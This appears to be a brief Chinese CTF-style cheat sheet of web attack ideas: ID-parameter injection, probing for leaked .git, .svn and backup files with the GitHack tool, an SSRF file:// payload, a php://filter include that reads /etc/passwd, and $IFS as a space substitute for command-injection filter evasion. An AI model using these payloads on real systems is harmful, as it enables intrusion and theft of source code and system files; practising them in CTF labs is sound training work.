## 基础脑洞/思路
1. index.php?id=1  遍历id 注入
2. robots.txt .git .svn .swp ~ .bak 源码，目录泄露
  .git泄露利用EXP
  https://github.com/lijiejie/GitHack


## ssrf常用payload
`admin=1&url=file://www.ichunqiu.com/var/www/html/flag.php`

## php7 直接崩溃bug
`include(‘php://filter/string.strip_tags/resource=/etc/passwd’)`
## $IFS
空格可以使用$IFS代替